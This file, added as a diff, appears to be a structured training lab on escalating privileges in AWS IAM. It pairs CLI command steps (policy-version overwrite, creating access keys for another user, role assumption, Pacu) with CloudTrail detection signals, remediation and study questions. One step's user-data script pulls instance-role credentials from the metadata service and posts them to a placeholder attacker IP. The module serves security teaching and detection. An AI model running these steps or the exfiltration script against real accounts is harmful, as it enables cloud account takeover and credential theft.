@@ -1,0 +1,231 @@
+name: "AWS IAM Privilege Escalation"
+id: "cloud-aws-iam-001"
+category: "Cloud Security"
+subcategory: "AWS / IAM"
+difficulty: "advanced"
+estimated_time: "90"
+
+tags:
+  - aws
+  - cloud-security
+  - iam
+  - privilege-escalation
+  - pmapper
+  - pacu
+  - least-privilege
+  - role-assumption
+  - ec2-user-data
+  - mitre-t1078.004
+
+description: |
+  Identify and exploit AWS IAM misconfigurations to escalate privileges from a
+  low-privilege identity to Administrator or root-equivalent access. Covers
+  the most common IAM privilege escalation paths including policy manipulation,
+  role assumption, and service exploitation.
+
+learning_objectives:
+  - Enumerate current IAM permissions and identify escalation paths
+  - Exploit common IAM privilege escalation techniques
+  - Use tools like Pacu and enumerate_iam for automated discovery
+  - Map findings to CIS AWS Foundations Benchmark controls
+
+tools:
+  - "AWS CLI"
+  - "Pacu"
+  - "Enumerate IAM"
+  - "PMapper"
+  - "Cloudsplaining"
+  - "Python 3"
+
+prerequisites:
+  - "Valid AWS access key and secret key (low-privilege)"
+  - "AWS CLI configured with target credentials"
+  - "Understanding of AWS IAM roles, policies, and trust relationships"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate current IAM identity and permissions"
+    commands:
+      - "# Identify current principal"
+      - "aws sts get-caller-identity"
+      - "# List attached policies"
+      - "aws iam list-attached-user-policies --user-name [iam_username]"
+      - "aws iam list-user-policies --user-name [iam_username]"
+      - "# List group memberships and group policies"
+      - "aws iam list-groups-for-user --user-name [iam_username]"
+      - "# Get policy document"
+      - "aws iam get-user-policy --user-name [iam_username] --policy-name [policy_name]"
+      - "# Automated permission enumeration"
+      - "python3 enumerate_iam.py --access-key [access_key] --secret-key [secret_key]"
+    expected_output: "Current identity, attached policies, group memberships, and effective permissions"
+    detection: "CloudTrail: GetCallerIdentity, ListAttachedUserPolicies, GetUserPolicy from unfamiliar principal"
+
+  - id: "step2"
+    phase: "reconnaissance"
+    action: "Map privilege escalation paths using PMapper"
+    commands:
+      - "pip3 install principalmapper"
+      - "# Create graph of IAM principals and permissions"
+      - "pmapper --profile [aws_profile] graph create"
+      - "# Query shortest escalation path to admin"
+      - "pmapper --profile [aws_profile] query 'preset privesc [current_arn]'"
+      - "# List all escalation paths"
+      - "pmapper --profile [aws_profile] analysis --output privesc_report.html"
+      - "# Visualize the graph"
+      - "pmapper --profile [aws_profile] visualize --output iam_graph.svg"
+    expected_output: "Privilege escalation paths from current identity to Administrator"
+    detection: "CloudTrail: ListRoles, ListPolicies, GetPolicyVersion — broad enumeration pattern"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Escalation Path 1 — CreatePolicyVersion (overwrite existing policy)"
+    commands:
+      - "# Check if CreatePolicyVersion is allowed"
+      - "aws iam simulate-principal-policy --policy-source-arn [user_arn] --action-names iam:CreatePolicyVersion --resource-arns '*'"
+      - "# If allowed — create a new policy version granting admin"
+      - "cat > /tmp/admin_policy.json << 'EOF'\n{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}\nEOF"
+      - "aws iam create-policy-version --policy-arn [target_policy_arn] --policy-document file:///tmp/admin_policy.json --set-as-default"
+      - "# Verify new permissions"
+      - "aws iam get-policy-version --policy-arn [target_policy_arn] --version-id v2"
+    expected_output: "New policy version set as default granting wildcard administrator access"
+    detection: "CloudTrail: CreatePolicyVersion with Action:* and Resource:* in policy document"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Escalation Path 2 — iam:PassRole + ec2:RunInstances (user data exploitation)"
+    commands:
+      - "# Check PassRole and RunInstances permissions"
+      - "aws iam simulate-principal-policy --policy-source-arn [user_arn] --action-names iam:PassRole ec2:RunInstances --resource-arns '*'"
+      - "# Find high-privilege roles that can be passed"
+      - "aws iam list-roles | python3 -c \"import sys,json; [print(r['Arn'],r['RoleName']) for r in json.load(sys.stdin)['Roles'] if 'Admin' in r['RoleName'] or 'FullAccess' in str(r)]\""
+      - "# Create malicious user data script"
+      - "cat > /tmp/userdata.sh << 'EOF'\n#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/[admin_role_name] > /tmp/creds.json\ncurl -X POST -d @/tmp/creds.json http://[attacker_ip]/exfil\nEOF"
+      - "base64 /tmp/userdata.sh > /tmp/userdata_b64.txt"
+      - "aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro --iam-instance-profile Name=[admin_role_name] --user-data file:///tmp/userdata_b64.txt --count 1"
+    expected_output: "EC2 instance launched with admin role credentials exfiltrated via user data"
+    detection: "CloudTrail: RunInstances with IamInstanceProfile containing high-privilege role"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Escalation Path 3 — iam:CreateAccessKey for another user"
+    commands:
+      - "# Check CreateAccessKey permission"
+      - "aws iam simulate-principal-policy --policy-source-arn [user_arn] --action-names iam:CreateAccessKey --resource-arns '*'"
+      - "# If allowed — create access key for admin user"
+      - "aws iam create-access-key --user-name [admin_username]"
+      - "# Configure new credentials"
+      - "aws configure --profile escalated"
+      - "aws sts get-caller-identity --profile escalated"
+    expected_output: "New access key created for administrator user; full access gained"
+    detection: "CloudTrail: CreateAccessKey for a different user than the requesting principal"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Escalation Path 4 — AssumeRole with overly permissive trust policy"
+    commands:
+      - "# List assumable roles"
+      - "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=null]]'"
+      - "# Find roles current user can assume"
+      - "aws sts assume-role --role-arn arn:aws:iam::[account_id]:role/[admin_role] --role-session-name pentest"
+      - "# Export temporary credentials"
+      - "export AWS_ACCESS_KEY_ID=[temp_access_key]"
+      - "export AWS_SECRET_ACCESS_KEY=[temp_secret_key]"
+      - "export AWS_SESSION_TOKEN=[session_token]"
+      - "aws sts get-caller-identity"
+    expected_output: "Temporary credentials for assumed admin role; elevated access confirmed"
+    detection: "CloudTrail: AssumeRole from unexpected principal; role chaining events"
+
+  - id: "step7"
+    phase: "exploitation"
+    action: "Automated exploitation with Pacu"
+    commands:
+      - "# Install and launch Pacu"
+      - "pip3 install pacu"
+      - "pacu"
+      - "# Set target keys"
+      - "import_keys [access_key] [secret_key]"
+      - "# Run privilege escalation module"
+      - "run iam__privesc_scan"
+      - "# Run enumeration"
+      - "run iam__enum_permissions"
+      - "run iam__enum_roles"
+    expected_output: "Automated identification and exploitation of privilege escalation paths"
+    detection: "CloudTrail: High volume of IAM enumeration calls from single key in short time"
+
+compliance_controls:
+  - standard: "CIS AWS Foundations Benchmark v1.5"
+    control: "1.16"
+    description: "Ensure IAM policies are attached only to groups or roles"
+  - standard: "CIS AWS Foundations Benchmark v1.5"
+    control: "1.1"
+    description: "Maintain current contact details"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-6"
+    description: "Least privilege"
+  - standard: "PCI DSS v4.0"
+    control: "7.3.1"
+    description: "All user access to system components is authorized"
+  - standard: "SOC2 CC6.3"
+    control: "CC6.3"
+    description: "Role-based access controls and least privilege"
+
+detection:
+  network_indicators:
+    - "Broad IAM API enumeration from single principal in short time window"
+    - "AssumeRole calls from principals that have not previously assumed that role"
+    - "CreatePolicyVersion with wildcard Action and Resource"
+  log_indicators:
+    - "CloudTrail: CreatePolicyVersion with Action:* in policy document"
+    - "CloudTrail: CreateAccessKey for a different user"
+    - "CloudTrail: AttachUserPolicy, AttachRolePolicy with AdministratorAccess"
+    - "CloudTrail: PassRole + RunInstances or CreateFunction in same session"
+    - "GuardDuty: Policy:IAMUser/RootCredentialUsage or PrivilegeEscalation:IAMUser findings"
+  endpoint_indicators:
+    - "AWS Config: IAMUserMFAEnabled and IAMRootAccessKeyCheck rules failing"
+    - "Security Hub: AWS Foundational Security Best Practices IAM findings"
+
+remediation:
+  immediate:
+    - "Rotate or disable compromised access keys immediately"
+    - "Review and restrict overly permissive IAM policies (remove wildcard actions)"
+    - "Audit all IAM roles with trust policies allowing broad AssumeRole"
+    - "Enable AWS CloudTrail in all regions with log file integrity validation"
+  long_term:
+    - "Enforce least privilege using IAM Access Analyzer"
+    - "Implement permission boundaries on all IAM roles and users"
+    - "Use Service Control Policies (SCPs) in AWS Organizations to restrict privilege escalation actions"
+    - "Enable MFA for all IAM users and require MFA for sensitive API calls"
+    - "Regular IAM access reviews using AWS IAM Access Analyzer"
+    - "Deploy Cloudsplaining for automated policy analysis"
+
+variables:
+  iam_username: "low_priv_user"
+  user_arn: "arn:aws:iam::123456789012:user/low_priv_user"
+  access_key: "AKIAIOSFODNN7EXAMPLE"
+  secret_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+  target_policy_arn: "arn:aws:iam::123456789012:policy/UserPolicy"
+  admin_username: "admin_user"
+  admin_role_name: "AdminRole"
+  account_id: "123456789012"
+  admin_role: "AdminRole"
+  attacker_ip: "10.10.10.1"
+  aws_profile: "target"
+  policy_name: "UserPolicy"
+
+assessment_questions:
+  - "What IAM permissions allow CreatePolicyVersion privilege escalation?"
+  - "How does iam:PassRole combined with ec2:RunInstances lead to privilege escalation?"
+  - "What is a permission boundary and how does it limit privilege escalation?"
+  - "Which AWS service generates finding PrivilegeEscalation:IAMUser?"
+  - "How do SCPs in AWS Organizations prevent privilege escalation?"
+
+references:
+  - url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+    title: "AWS IAM Privilege Escalation Methods - Rhino Security Labs"
+  - url: "https://github.com/RhinoSecurityLabs/pacu"
+    title: "Pacu - AWS Exploitation Framework"
+  - url: "https://github.com/nccgroup/PMapper"
+    title: "PMapper - IAM Privilege Escalation Analysis"
+  - url: "https://github.com/salesforce/cloudsplaining"
+    title: "Cloudsplaining - IAM Policy Analysis"
